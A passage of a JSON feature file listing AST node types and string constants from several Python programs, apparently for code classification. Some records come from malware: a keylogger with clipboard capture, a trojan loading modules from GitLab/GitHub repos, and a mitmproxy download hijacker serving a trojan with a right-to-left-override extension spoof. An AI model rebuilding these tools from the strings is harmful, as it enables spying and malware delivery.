            "ExceptHandler",
            "ClassDef",
            "Constant",
            "While",
            "Import",
            "Compare",
            "Lt",
            "Try",
            "Expr",
            "JoinedStr",
            "Return",
            "keyword",
            "BitOr",
            "Assign",
            "alias",
            "arguments",
            "Attribute",
            "If",
            "BinOp",
            "Mult",
            "ImportFrom",
            "arg",
            "Eq"
        ],
        "Strings": [
            "",
            "GetClipboardData",
            "user32",
            "TIMEOUT",
            "stdout",
            "log",
            "hm",
            "current_window",
            "save_stdout",
            "StringIO",
            "GetModuleBaseNameA",
            "__main__",
            "value",
            "e",
            "thread_time",
            "io",
            "OpenProcess",
            "hwnd",
            "sys",
            "V",
            "GetWindowTextA",
            "CloseHandle",
            "__init__",
            "process_id",
            "os",
            "h_process",
            "\n",
            ": window name unknown",
            "psapi",
            "pyHook",
            "KeyLogger",
            "kl",
            " Captures the active window and its associated process ID ",
            "window_title",
            "mykeystroke",
            "kernel32",
            "OpenClipboard",
            "create_string_buffer",
            "win32clipboard",
            "time",
            "byref",
            "Ascii",
            "event",
            "Key",
            "self",
            "pyWinhook",
            "GetForegroundWindow",
            "run",
            "print",
            "WindowName",
            "HookKeyboard",
            "c_ulong",
            "pid",
            "PumpWaitingMessages",
            "cytpes",
            "HookManager",
            "done.",
            "getvalue",
            "end",
            "CloseClipboard",
            "windll",
            "get_current_process",
            "GetWindowThreadProcessId",
            "__name__",
            "executable",
            "pythoncom",
            "decode",
            "chr",
            "[PASTE] - ",
            "KeyDown",
            "UnicodeDecodeError"
        ]
    },
    {
        "Imports": [],
        "Function_Calls": [
            "Module",
            "FunctionDef",
            "Call",
            "Load",
            "Subscript",
            "For",
            "Store",
            "Name",
            "FormattedValue",
            "With",
            "ClassDef",
            "Constant",
            "While",
            "Import",
            "Compare",
            "Not",
            "Expr",
            "JoinedStr",
            "Return",
            "UnaryOp",
            "Assign",
            "alias",
            "arguments",
            "withitem",
            "Attribute",
            "If",
            "ImportFrom",
            "arg",
            "Eq"
        ],
        "Strings": [
            "",
            "Deze functie zal een map aanmaken in de map logs op basis van de hostname + datum ",
            "new_directory_path",
            "check_remote_repo",
            "config/config.txt",
            "create_directory_in_logs",
            "socket",
            "load",
            "log",
            "hostname",
            "gethostname",
            "datetime",
            "import_module",
            "__main__",
            "trojan",
            "config_file",
            "sleep",
            "Deze functie zal de applicatie runnen ",
            "Deze functie zal alle modules inladen van de config en ze ook runnen ",
            "__init__",
            "os",
            "module",
            "run_modules",
            "config",
            "send_logs_to_github",
            "current_day",
            "r",
            "join",
            "module_data",
            "first_time",
            "class_name",
            "modules.",
            "Trojan",
            "today",
            "logs_directory",
            "time",
            "Github",
            "generate_unique_id",
            "number",
            "getattr",
            "load_modules",
            "Deze functie zal unique id maken op basis van de hostname + datum + een random nummer",
            "config_path",
            "self",
            "int",
            "git@github.com:laurensDSM/test0.git",
            "uniform",
            "run",
            "module_path",
            "strftime",
            "date",
            "random",
            "github",
            "json",
            "repo_url",
            "unique_id",
            "__name__",
            "logs",
            "main",
            "makedirs",
            "github_connectie",
            "exists",
            "path",
            "open",
            "_",
            "importlib",
            "id",
            "%Y%m%d",
            "my_class",
            "get_config",
            "module_name"
        ]
    },
    {
        "Imports": [],
        "Function_Calls": [
            "Module",
            "FunctionDef",
            "Call",
            "Load",
            "Pass",
            "NotEq",
            "Subscript",
            "For",
            "Store",
            "Name",
            "With",
            "ExceptHandler",
            "ClassDef",
            "Constant",
            "While",
            "Import",
            "Compare",
            "List",
            "Not",
            "Try",
            "Expr",
            "Return",
            "keyword",
            "UnaryOp",
            "Assign",
            "Add",
            "alias",
            "arguments",
            "withitem",
            "Attribute",
            "If",
            "BinOp",
            "arg",
            "Eq"
        ],
        "Strings": [
            "configUrl",
            "utf-8",
            "mod_path",
            "__config_url",
            "__loader",
            "requests",
            "w",
            "__stop",
            "https://gitlab.com/threetoes/config-repo/raw/master/modules/",
            "SourceFileLoader",
            "a",
            "mkdir",
            "remove",
            "name",
            "__conf",
            "__main__",
            "e",
            "sleep",
            "content",
            "__init__",
            "load_module",
            "ModuleLoader",
            "os",
            "b494b07e-5e27-4073-8db2-f550d60308e4",
            "threading",
            "start",
            "f",
            "machinery",
            "mod_name",
            "Trojan",
            "modules",
            "importlib",
            "time",
            "modulesRepo",
            ".json",
            "loads",
            "Exception",
            "self",
            "__loaded_modules",
            "write",
            "print",
            "__update_config",
            "run",
            "modules/",
            "__update_thread",
            "configRepo",
            "mod",
            "./modules",
            "get",
            "importlib.machinery",
            ".py",
            "isdir",
            "json",
            "__modules_repo",
            "__name__",
            "Thread",
            "main",
            "https://gitlab.com/threetoes/config-repo/raw/master/config/",
            "resp",
            "decode",
            "path",
            "__conf_update_loop",
            "target",
            "open",
            "id",
            "isfile",
            "t"
        ]
    },
    {
        "Imports": [],
        "Function_Calls": [
            "Assign",
            "Module",
            "alias",
            "Call",
            "Load",
            "Attribute",
            "Expr",
            "Import",
            "ImportFrom",
            "Store",
            "keyword",
            "Name"
        ],
        "Strings": [
            "t2",
            "spyware",
            "Thread",
            "t1",
            "threading",
            "start",
            "game",
            "trojan",
            "target"
        ]
    },
    {
        "Imports": [],
        "Function_Calls": [
            "Module",
            "FunctionDef",
            "Call",
            "Load",
            "NotEq",
            "Subscript",
            "Store",
            "Name",
            "Constant",
            "Import",
            "Compare",
            "List",
            "Expr",
            "USub",
            "UnaryOp",
            "Assign",
            "Add",
            "And",
            "alias",
            "arguments",
            "Attribute",
            "Dict",
            "If",
            "BoolOp",
            "BinOp",
            "ImportFrom",
            "arg",
            "Eq"
        ],
        "Strings": [
            "",
            "request",
            "exe",
            "192.168.188.171",
            "torjan_download_url",
            "front_file_extension",
            "SPOOF_EXTENSION",
            "zip",
            "TARGET_TEXTENSIONS",
            "trojan",
            "[+] Got interesting flow",
            "[+] Renaming trojan to spoof its extension",
            "create",
            "endswith",
            "/",
            "mitmproxy",
            "pretty_url",
            ".",
            "os",
            "WEB_ROOT",
            "IP",
            "mitm",
            "response",
            "/var/www/html/",
            "http://",
            "[+] Generating a trojan for ",
            "Response",
            "subprocess",
            "\u202e",
            "Trojan",
            "front_file",
            "compile",
            "tuple",
            "new_name",
            "http://192.168.188.171/file.exe",
            "flow",
            "download_file_name",
            "rename",
            "EVIL_FILE",
            "print",
            "trojan_file",
            ".exe",
            "reversed",
            "http",
            "#",
            "front_file_name",
            "host",
            "make",
            "Location",
            "spoofed_file",
            ".zip",
            "*",
            ".pdf",
            "split",
            "join"
        ]
    },
    {
        "Imports": [],
        "Function_Calls": [
            "MatchClass",
            "Module",
            "FunctionDef",
            "Call",
            "Load",
            "Gt",
            "Pass",
            "Match",
            "match_case",
            "NotEq",
            "Subscript",
            "For",
            "Store",
            "Name",
            "FormattedValue",
            "comprehension",
            "ExceptHandler",
            "ClassDef",
            "Constant",
            "MatchOr",
            "Or",
            "In",
            "Tuple",
            "Import",
            "Compare",
            "ListComp",
            "IsNot",
            "List",
            "Not",
            "NotIn",
            "AnnAssign",
            "Try",
            "Expr",
            "USub",
            "JoinedStr",
            "Return",
            "IfExp",
            "Is",
            "keyword",
            "DictComp",
            "BitOr",
            "UnaryOp",
            "Starred",
            "MatchAs",
            "Eq",
            "Assign",
            "Add",
            "MatchValue",
            "And",
            "alias",
            "Raise",
            "arguments",
            "withitem",
            "Attribute",
            "Dict",
            "Sub",
            "If",
            "BinOp",
            "Assert",
            "ImportFrom",
            "BoolOp",
            "Mult",
            "arg",
            "With"
        ],
        "Strings": [
            "get_parallel_model",
            "",
            "no_grad",
            "preprocess",
            "SGD",
            "get_fm",
            "EKFAC",
            "check_hash",
            "ArgumentParser",
            "ConstantLR",
            "epoch_fn",
            "dirname",
            "class_dict",
            " not in \n",
            "input",
            "class_name",
            "name_list",
            "\n    | Create a model instance.\n    | For arguments not included in :attr:`kwargs`,\n      use the default values in :attr:`config`.\n    | The default value of :attr:`folder_path` is\n      ``'{model_dir}/{dataset.data_type}/{dataset.name}'``.\n    | For model implementation, see :class:`Model`.\n\n    Args:\n        model_name (str): The model name.\n        model (str | Model): The model instance or model name\n            (as the alias of `model_name`).\n        dataset_name (str): The dataset name.\n        dataset (str | trojanzoo.datasets.Dataset):\n            Dataset instance or dataset name\n            (as the alias of `dataset_name`).\n        config (Config): The default parameter config.\n        class_dict (dict[str, type[Model]]):\n            Map from model name to model class.\n            Defaults to ``{}``.\n        **kwargs: The keyword arguments\n            passed to model init method.\n\n    Returns:\n        Model: The model instance.\n    ",
            "full_config",
            "staticmethod",
            "layer_name_list",
            "callable",
            "Define optimizer and lr_scheduler.\n\n        Args:\n            parameters (str | ~collections.abc.Iterable[torch.nn.parameter.Parameter]):\n                The parameters to optimize while other model parameters are frozen.\n                If :class:`str`, set :attr:`parameters` as:\n\n                    * ``'features': self._model.features``\n                    * ``'classifier' | 'partial': self._model.classifier``\n                    * ``'full': self._model``\n\n                Defaults to ``'full'``.\n            OptimType (str | type[Optimizer]):\n                The optimizer type.\n                If :class:`str`, load from module :any:`torch.optim`.\n                Defaults to ``'SGD'``.\n            lr (float): The learning rate of optimizer. Defaults to ``0.1``.\n            momentum (float): The momentum of optimizer. Defaults to ``0.0``.\n            weight_decay (float): The momentum of optimizer. Defaults to ``0.0``.\n            lr_scheduler (bool): Whether to enable lr_scheduler. Defaults to ``False``.\n            lr_scheduler_type (str): The type of lr_scheduler.\n                Defaults to ``'CosineAnnealingLR'``.\n\n                Available lr_scheduler types (use string rather than type):\n\n                    * :any:`torch.optim.lr_scheduler.StepLR`\n                    * :any:`torch.optim.lr_scheduler.CosineAnnealingLR`\n                    * :any:`torch.optim.lr_scheduler.ExponentialLR`\n            lr_step_size (int): :attr:`step_size` for :any:`torch.optim.lr_scheduler.StepLR`.\n                Defaults to ``30``.\n            lr_gamma (float): :attr:`gamma` for :any:`torch.optim.lr_scheduler.StepLR`\n                or :any:`torch.optim.lr_scheduler.ExponentialLR`.\n                Defaults to ``0.1``.\n            epochs (int): Total training epochs.\n                ``epochs - lr_warmup_epochs`` is passed as :attr:`T_max`\n                to any:`torch.optim.lr_scheduler.CosineAnnealingLR`.\n                Defaults to ``None``.\n            lr_min (float): The minimum of learning rate.\n                It's passed as :attr:`eta_min`\n                to any:`torch.optim.lr_scheduler.CosineAnnealingLR`.\n                Defaults to ``0.0``.\n            lr_warmup_epochs (int): Learning rate warmup epochs.\n                Passed as :attr:`total_iters` to lr_scheduler.\n                Defaults to ``0``.\n            lr_warmup_method (str): Learning rate warmup methods.\n                Choose from ``['constant', 'linear']``.\n                Defaults to ``'constant'``.\n            lr_warmup_decay (float): Learning rate warmup decay factor.\n                Passed as :attr:`factor` (:attr:`start_factor`) to lr_scheduler.\n                Defaults to ``0.01``.\n            **kwargs: Keyword arguments passed to optimizer init method.\n\n        Returns:\n            (torch.optim.Optimizer, torch.optim.lr_scheduler._LRScheduler):\n                The tuple of optimizer and lr_scheduler.\n        ",
            "optim",
            "_list",
            "writer",
            "state_dict",
            "Add model arguments to argument parser group.\n        View source to see specific arguments.\n\n        Note:\n            This is the implementation of adding arguments.\n            The concrete model class may override this method to add more arguments.\n            For users, please use :func:`add_argument()` instead, which is more user-friendly.\n        ",
            "lower",
            "trojanzoo.utils.module",
            "criterion",
            "Dataset",
            "``x -> self.get_final_fm -> self.classifier -> return``",
            "last_bias_value",
            "lr_gamma",
            "CrossEntropyLoss",
            "inplace",
            "load_state_dict",
            "Generate target labels of a batched input based on\n            the classification confidence ranking index.\n\n        Args:\n            _input (torch.Tensor): The input tensor.\n            idx (int): The classification confidence\n                rank of target class.\n                Defaults to ``1``.\n            same (bool): Generate the same label\n                for all samples using mod.\n                Defaults to ``False``.\n\n        Returns:\n            torch.Tensor:\n                The generated target label with shape ``(N)``.\n\n        See Also:\n            The implementation is in\n            :func:`trojanzoo.utils.model.generate_target()`.\n        ",
            "validate_interval",
            "autocast",
            ".Only \"linear\" and \"constant\" are supported.",
            "dropout",
            "repeat_idx",
            "eval",
            "params",
            "activation_inplace",
            "Get logits of :attr:`_input`.\n\n        Note:\n            Users should use model as Callable function\n            rather than call this method directly,\n            because ``__call__`` supports :any:`torch.cuda.amp`.\n\n        Args:\n            _input (torch.Tensor): The batched input tensor.\n            parallel (bool): Whether to use parallel model\n                `self.model` rather than `self._model`.\n                Defautls to ``False``.\n            randomized_smooth (bool | None): Whether to use randomized smoothing.\n                If it's ``None``, use :attr:`self.randmized_smooth` instead.\n                Defaults to ``None``.\n            rs_sigma (float | None): Randomized smoothing sampling std :math:`\\sigma`.\n                If it's ``None``, use :attr:`self.rs_sigma` instead.\n                Defaults to ``None``.\n            rs_n (int): Randomized smoothing sampling number.\n                If it's ``None``, use :attr:`self.rs_n` instead.\n                Defaults to ``None``.\n            **kwargs: Keyword arguments passed to :meth:`forward()`.\n\n        Returns:\n            torch.Tensor: The logit tensor with shape ``(N, C)``.\n        ",
            "available_models",
            "features",
            "Self",
            "model name (default: config[model][default_model])",
            "getattr",
            "schedulers",
            "weight",
            "trojanzoo.utils.train",
            "ReLU",
            "dict",
            "len",
            "print",
            "ansi",
            "Invalid lr_scheduler_type=",
            "popitem",
            "Sets the module in evaluation mode.\n\n        See Also:\n            :any:`torch.nn.Module.eval`.\n        ",
            "verbose",
            "DataParallel",
            "sorted",
            "str",
            "value",
            "keys",
            "get_prob",
            ".pth",
            "Linear",
            "features.",
            "os",
            "torch.utils.data",
            "start_epoch",
            "save",
            " loaded from: ",
            "momentum",
            "trojanzoo.environ",
            "_LRScheduler",
            "indent",
            "k",
            "Identity",
            "env",
            "insert",
            "get_target_prob",
            "get_official_weights",
            "randomized smoothing sampling std (default: 0.01)",
            "path",
            "strict",
            "param_list",
            "softmax",
            "parallel",
            "store_true",
            "rs_sigma",
            "Model ",
            "_classification",
            "data",
            "amp",
            "loss",
            "lr",
            "metric_fn",
            "typing",
            "StepLR",
            "dim",
            "weights",
            "summary",
            "file_path",
            "Exception",
            "Returns an iterator over module parameters.\n\n        See Also:\n            :any:`torch.nn.Module.parameters`.\n        ",
            "Returns an iterator over all modules in the network.\n\n        See Also:\n            :any:`torch.nn.Module.modules`.\n        ",
            "generate_target",
            "trojanzoo.utils.tensor",
            "get",
            "requires_grad_",
            "component=",
            "model_dir",
            "-m",
            "join",
            "get_data_fn",
            "Returns an iterator over immediate children modules.\n\n        See Also:\n            :any:`torch.nn.Module.children`.\n        ",
            "Generator",
            "memo",
            "zero_grad",
            "DEFAULT",
            "_ArgumentGroup",
            "forward",
            "name",
            "idx",
            "--pretrained",
            "isinstance",
            "names_dict",
            "nn.Module",
            "get_parameter_from_name",
            "_epoch",
            "get_class",
            "list",
            "Moves all model parameters and buffers to the CPU.\n\n        See Also:\n            :any:`torch.nn.Module.cpu`.\n        ",
            "normpath",
            "Define feature extractor.\n\n        Returns:\n            torch.nn.Identity: Identity module.\n        ",
            "--dataset",
            "pretrained",
            "_lr_scheduler",
            "i",
            "non_leaf",
            "super",
            "Sets gradients of all model parameters to zero.\n\n        See Also:\n            :any:`torch.nn.Module.zero_grad`.\n        ",
            "RuntimeError",
            "remove_misclassify",
            "default_model",
            "AdaptiveAvgPool2d",
            "eq",
            "``x -> self.get_fm -> self.pool -> self.flatten -> return``",
            "float",
            "\n        | Define classifier as\n            ``(Linear -> Activation -> Dropout ) * (len(num_features) - 1) -> Linear``.\n        | If there is only 1 linear layer, its name will be ``'fc'``.\n        | Else, all layer names will be indexed starting from ``0``\n            (e.g., ``'fc1', 'relu1', 'dropout0'``).\n\n        Args:\n            num_features (list[int]): List of feature numbers.\n                Each element serves as the :attr:`in_features` of current layer\n                and :attr:`out_features` of preceding layer.\n                Defaults to ``[]``.\n            num_classes (int): The number of classes.\n                This serves as the :attr:`out_features` of last layer.\n                Defaults to ``None``.\n            activation (type[torch.nn.Module]):\n                The type of activation layer.\n                Defaults to :any:`torch.nn.ReLU`.\n            activation_inplace (bool): Whether to use inplace activation.\n                Defaults to ``'True'``\n            dropout (float): The drop out probability.\n                Will **NOT** add dropout layers if it's ``0``.\n                Defaults to ``0.0``.\n            **kwargs: Any keyword argument (unused).\n\n        Returns:\n            torch.nn.Sequential: The sequential classifier.\n\n        :Examples:\n            >>> from trojanzoo.models import _Model\n            >>>\n            >>> _Model.define_classifier(num_features=[5,4,4], num_classes=10)\n            Sequential(\n                (fc1): Linear(in_features=5, out_features=4, bias=True)\n                (relu1): ReLU(inplace=True)\n                (dropout1): Dropout(p=0.5, inplace=False)\n                (fc2): Linear(in_features=4, out_features=4, bias=True)\n                (relu2): ReLU(inplace=True)\n                (dropout2): Dropout(p=0.5, inplace=False)\n                (fc3): Linear(in_features=4, out_features=10, bias=True)\n            )\n        ",
            "main_lr_scheduler",
            "removeprefix",
            "loader_train",
            "_validate",
            "Get the probability classification vector of :attr:`_input`.\n\n        Args:\n            _input (torch.Tensor): The batched input tensor\n                passed to :meth:`_Model.get_logits()`.\n            **kwargs: Keyword arguments passed to :meth:`get_logits()`.\n\n        Returns:\n            torch.Tensor: The probability tensor with shape ``(N, C)``.\n        ",
            "default_dataset",
            "BasicObject",
            "NotImplementedError",
            "bool",
            "loader_valid",
            "group",
            "tuple",
            "lr_step_size",
            "load local pretrained weights (default: False)",
            "none",
            "self",
            "Model",
            "Get the final feature map of :attr:`_input`,\n        which is the output of :attr:`self.flatten`\n        and input of :attr:`self.classifier`.\n        Call :meth:`_Model.get_final_fm()`.\n\n        Args:\n            _input (torch.Tensor): The batched input tensor\n                passed to :meth:`_Model.get_final_fm()`.\n            **kwargs: Keyword arguments passed to :meth:`_Model.get_final_fm()`.\n\n        Returns:\n            torch.Tensor: The feature tensor with shape ``(N, dim)``.\n        ",
            "gather",
            "whether to use randomized smoothing (default: False)",
            "SequentialLR",
            "prints",
            "target",
            "split",
            "_output",
            "get_model_class",
            "classifier.",
            "co_varnames",
            "Returns an iterator over module parameters, yielding both the\n        name of the parameter as well as the parameter itself.\n\n        See Also:\n            :any:`torch.nn.Module.named_parameters`.\n        ",
            "set_to_none",
            "activation_name",
            "num_gpus",
            "activate_params",
            "--model",
            "seq_only",
            "TypeError",
            "children",
            "Remove misclassified samples in a data batch.\n\n        Args:\n            data (tuple[torch.Tensor, torch.Tensor]):\n                The input and label to process with shape ``(N, *)`` and ``(N)``.\n            **kwargs: Keyword arguments passed to :meth:`get_data`.\n\n        Returns:\n            (torch.Tensor, torch.Tensor):\n                The processed input and label with shape ``(N - k, *)`` and ``(N - k)``.\n        ",
            "load official pretrained weights (default: False)",
            "get_state_dict",
            "Evaluate the model.\n\n        Returns:\n            (float, float): Accuracy and loss.\n        ",
            "folder_path",
            "lr_warmup_decay",
            " saved at: ",
            "gamma",
            "fc",
            "Callable",
            "tensor",
            "--official",
            "layer_input",
            "partial",
            "Calculate the loss using :attr:`self.criterion`\n        (:attr:`self.criterion_noreduction`).\n\n        Args:\n            _input (torch.Tensor | None): The batched input tensor.\n                If :attr:`_output` is provided, this argument will be ignored.\n                Defaults to ``None``.\n            _label (torch.Tensor): The label of the batch with shape ``(N)``.\n            _output (torch.Tensor | None): The logits of :attr:`_input`.\n                If ``None``, use :attr:`_input` to calculate logits.\n                Defaults to ``None``.\n            reduction (str): Specifies the reduction to apply to the output.\n                Choose from ``['none', 'mean']``.\n                Defaults to ``'mean'``.\n            **kwargs: Keyword arguments passed to :meth:`get_logits()`\n                if :attr:`_output` is not provided.\n\n        Returns:\n            torch.Tensor:\n                A scalar loss tensor (with shape ``(N)`` if ``reduction='none'``).\n        ",
            "OptimType",
            "Get layer names of model instance.\n\n        Args:\n            depth (int): The traverse depth.\n                Defaults to ``-1`` (means :math:`\\infty`).\n            prefix (str): The prefix string to all elements.\n                Defaults to empty string ``''``.\n            use_filter (bool): Whether to filter out certain layer types.\n\n                * :any:`torchvision.transforms.Normalize`\n                * :any:`torch.nn.Dropout`\n                * :any:`torch.nn.BatchNorm2d`\n                * :any:`torch.nn.ReLU`\n                * :any:`torch.nn.Sigmoid`\n            non_leaf (bool): Whether to include non-leaf nodes.\n                Defaults to ``False``.\n            seq_only (bool): Whether to only traverse children\n                of :any:`torch.nn.Sequential`.\n                If ``False``, will traverse children of all :any:`torch.nn.Module`.\n                Defaults to ``False``.\n\n        Returns:\n            list[str]: The list of all layer names.\n\n        See Also:\n            The implementation is in\n            :func:`trojanzoo.utils.model.get_layer_name()`.\n        ",
            "--rs_n",
            "DataLoader",
            "unsqueeze",
            "_Model",
            "keep_vars",
            "pre_conditioner",
            "WeightsEnum",
            "add_noise",
            "tag",
            "append",
            "grad_clip",
            "arg_list",
            "x",
            "progress",
            "flatten",
            "numpy",
            "_input",
            "sub_list",
            "get_layer_name",
            "lr_warmup_epochs",
            "define_preprocess",
            "config",
            "validate_fn",
            "start_factor",
            "type(dataset)=",
            "Sets the module in training mode.\n\n        See Also:\n            :any:`torch.nn.Module.train`.\n        ",
            ".Only \"StepLR\", \"CosineAnnealingLR\" and \"ExponentialLR\" are supported.",
            "output",
            "hasattr",
            "milestones",
            "get_data",
            "data_type",
            "get_config",
            "Parameter",
            "utils",
            "Module",
            "--model_dir",
            "optimizer",
            "\n    | Add model arguments to argument parser.\n    | For specific arguments implementation, see :meth:`Model.add_argument()`.\n\n    Args:\n        parser (argparse.ArgumentParser): The parser to add arguments.\n        model_name (str): The model name.\n        model (str | Model): The model instance or model name\n            (as the alias of `model_name`).\n        config (Config): The default parameter config,\n            which contains the default dataset and model name if not provided.\n        class_dict (dict[str, type[Model]]):\n            Map from model name to model class.\n            Defaults to ``{}``.\n\n    Returns:\n        argparse._ArgumentGroup: The argument group.\n    ",
            "Iterator",
            "correct_name",
            "Define preprocess before feature extractor.\n\n        Returns:\n            torch.nn.Identity: Identity module.\n        ",
            "set",
            "Returns an iterator over immediate children modules, yielding both\n        the name of the module as well as the module itself.\n\n        See Also:\n            :any:`torch.nn.Module.named_children`.\n        ",
            "Softmax",
            "--randomized_smooth",
            "-d",
            "--suffix",
            "directory to store pretrained models",
            "type",
            "named_parameters",
            "v",
            "destination",
            "classifier",
            "    dataset=",
            "fn",
            "makedirs",
            "apply",
            "_input_noise",
            "_",
            "forward_fn",
            "d",
            "Copies parameters and buffers from :attr:`state_dict`\n        into this module and its descendants.\n\n        See Also:\n            :any:`torch.nn.Module.load_state_dict`.\n        ",
            "load",
            "constant",
            "official",
            "    parameters=",
            "result",
            "module",
            "_label",
            "collections",
            "nn",
            "dest",
            "lr_scheduler_type",
            "__code__",
            "CosineAnnealingLR",
            "loss_weights",
            "Mapping",
            "prefix",
            "format",
            "Get one certain intermediate layer output\n        of :attr:`_input` from any intermediate layer.\n\n        Args:\n            _input (torch.Tensor): The batched input tensor\n                from :attr:`layer_input`.\n            layer_output (str): The intermediate output layer name.\n                Defaults to ``'classifier'``.\n            layer_input (str): The intermediate layer name of :attr:`_input`.\n                Defaults to ``'input'``.\n            seq_only (bool): Whether to only traverse children\n                of :any:`torch.nn.Sequential`.\n                If ``False``, will traverse children of all :any:`torch.nn.Module`.\n                Defaults to ``True``.\n\n        Returns:\n            torch.Tensor: The output of layer :attr:`layer_output`.\n\n        See Also:\n            The implementation is in\n            :func:`trojanzoo.utils.model.get_layer()`.\n        ",
            "dataset",
            "__name__",
            "A specific model class which inherits :any:`torch.nn.Module`.\n\n    Args:\n        num_classes (int): Number of classes.\n        **kwargs: Keyword arguments passed to :meth:`define_preprocess`,\n            :meth:`define_features` and :meth:`define_classifier`.\n\n    Attributes:\n        num_classes (int): Number of classes. Defaults to ``None``.\n\n        preprocess (torch.nn.Module): Defaults to :meth:`define_preprocess()`.\n        features (torch.nn.Module): Defaults to :meth:`define_features()`.\n        pool (torch.nn.Module): :any:`torch.nn.AdaptiveAvgPool2d` ``((1, 1))``.\n        classifier (torch.nn.Module): Defaults to :meth:`define_classifier()`.\n    ",
            "use_filter",
            "type(parameters)=",
            "cuda",
            "define_classifier",
            "trojanzoo.configs",
            "loader",
            "weight_decay",
            "name=",
            "Define criterion to calculate loss.\n        Defaults to use :any:`torch.nn.CrossEntropyLoss`.\n\n        Args:\n            weight (torch.Tensor | None):\n                The loss weights passed to :any:`torch.nn.CrossEntropyLoss`.\n                Defaults to :attr:`self.loss_weights`.\n            **kwargs: Keyword arguments passed to :any:`torch.nn.CrossEntropyLoss`.\n        ",
            "mode",
            "torch.nn",
            "full",
            "Train",
            "rs_n",
            "total_iters",
            "argparse",
            "add_argument_group",
            "randomized_smooth",
            "peer",
            "get_name",
            "trojanzoo.utils.model",
            "Sequential",
            "save_fn",
            "lr_warmup_method",
            "ExponentialLR",
            "get_available_models",
            "define_optimizer",
            "model_ema_steps",
            "{yellow}{k}{reset}",
            "trojanzoo.datasets",
            "num_classes",
            "Load pretrained model weights.\n\n        Args:\n            file_path (str | None): The file path to load pretrained weights.\n                If ``'official'``, call :meth:`get_official_weights()`.\n                Defaults to ``'{folder_path}/{self.name}{suffix}.pth'``.\n            folder_path (str | None): The folder path containing model checkpoint.\n                It is used when :attr:`file_path` is not provided.\n                Defaults to :attr:`self.folder_path`.\n            suffix (str | None): The suffix string to model weights file.\n                Defaults to :attr:`self.suffix`.\n            inplace (bool): Whether to change model parameters.\n                If ``False``, will only return the dict but not change model parameters.\n                Defaults to ``True``.\n            map_location (str | ~torch.torch.device | dict):\n                Passed to :any:`torch.load`.\n                Defaults to ``'cpu'``.\n\n                Note:\n                    The device of model parameters will still be ``'cuda'``\n                    if there is any cuda available.\n                    This argument only affects intermediate operation.\n            component (str): Specify which part of the weights to load.\n                Choose from ``['full', 'features', 'classifier']``.\n                Defaults to ``'full'``.\n            strict (bool): Passed to :any:`torch.nn.Module.load_state_dict`.\n                Defaults to ``True``.\n            verbose (bool): Whether to output auxiliary information.\n                Defaults to ``False``.\n            indent (int): The indent of output auxialiary information.\n            **kwargs: Keyword arguments passed to :any:`torch.load`.\n\n        Returns:\n            OrderedDict[str, torch.Tensor]: The model weights OrderedDict.\n        ",
            "add_module",
            "exists",
            "OrderedDict",
            "range",
            "TYPE_CHECKING",
            "model_ema",
            "__call__",
            "file_path=",
            "Output all available model names.\n\n    Args:\n        class_dict (dict[str, type[Model]]): Map from model name to model class.\n            Defaults to ``{}``.\n        indent (int): The space indent for the entire string.\n            Defaults to ``0``.\n    ",
            "layer_output",
            "step_size",
            "LinearLR",
            "epochs",
            "parser",
            "Get the parallel model if there are more than 1 GPU avaiable.\n\n        Warning:\n            :any:`torch.nn.DataParallel` would be deprecated according to\n            https://github.com/pytorch/pytorch/issues/65936.\n            We need to consider using\n            :any:`torch.nn.parallel.DistributedDataParallel` instead.\n\n        Args:\n            _model (_Model): The non-parallel model.\n        Returns:\n            _Model | nn.DataParallel: The parallel model if there are more than 1 GPU avaiable.\n        ",
            "Get the class classification result of :attr:`_input`\n        (using :any:`torch.argmax`).\n\n        Args:\n            _input (torch.Tensor): The batched input tensor\n                passed to :meth:`_Model.get_logits()`.\n            **kwargs: Keyword arguments passed to :meth:`get_logits()`.\n\n        Returns:\n            torch.Tensor: The classes tensor with shape ``(N)``.\n        ",
            "model_name",
            "__init__",
            ".",
            "named_modules",
            "trojanzoo.utils.output",
            "linear",
            "Returns a dictionary containing a whole state of the module.\n\n        See Also:\n            :any:`torch.nn.Module.state_dict`.\n        ",
            "Returns an iterator over all modules in the network, yielding\n        both the name of the module as well as the module itself.\n\n        See Also:\n            :any:`torch.nn.Module.named_modules`.\n        ",
            "classmethod",
            "_dict",
            "accuracy",
            "_compare",
            " not in ",
            "values",
            "_model",
            "{yellow}model{reset}",
            "next",
            "cpu",
            "Get the probability w.r.t. :attr:`target` class of :attr:`_input`\n        (using :any:`torch.gather`).\n\n        Args:\n            _input (torch.Tensor): The batched input tensor\n                passed to :meth:`_Model.get_logits()`.\n            target (int | list[int] | torch.Tensor): Batched target classes.\n            **kwargs: Keyword arguments passed to :meth:`get_logits()`.\n\n        Returns:\n            torch.Tensor: The probability tensor with shape ``(N)``.\n        ",
            "Change if autograd should record operations on parameters in this\n        module.\n\n        See Also:\n            :any:`torch.nn.Module.requires_grad_`.\n        ",
            "add_argument",
            "validate",
            "Prints a string summary of the model instance by calling\n        :func:`trojanzoo.utils.module.BasicObject.summary()`\n        and :func:`trojanzoo.utils.model.summary()`.\n\n        Args:\n            depth (int): Passed to :func:`trojanzoo.utils.model.summary()`.\n                If ``None``, set as ``env['verbose']``.\n                If still ``None``, set as ``1``.\n                Defaults to ``None``.\n            verbose (bool): Passed to :func:`trojanzoo.utils.model.summary()`.\n                Defaults to ``True``.\n            indent (int): Passed to :func:`trojanzoo.utils.module.BasicObject.summary()`\n                and passed to :func:`trojanzoo.utils.model.summary()` with ``10`` more.\n                Defaults to ``0``.\n            **kwargs: Passed to :func:`trojanzoo.utils.model.summary()`.\n        ",
            "update",
            "device",
            "create",
            "torch.optim.lr_scheduler",
            "reduction",
            "named_children",
            "action",
            "define_criterion",
            "model_class_name",
            "Get the feature map of :attr:`_input`,\n        which is the output of :attr:`self.features`\n        and input of :attr:`self.pool`.\n        Call :meth:`_Model.get_fm()`.\n\n        Args:\n            _input (torch.Tensor): The batched input tensor\n                passed to :meth:`_Model.get_fm()`.\n            **kwargs: Keyword arguments passed to :meth:`_Model.get_fm()`.\n\n        Returns:\n            torch.Tensor: The feature tensor with shape ``(N, C', H', W')``.\n        ",
            "same",
            "recurse",
            "num_features",
            "get_layer",
            "ExponentialMovingAverage",
            "KFAC",
            "T_max",
            "Iterable",
            "randomized smoothing sampling number (default: 100)",
            "Config",
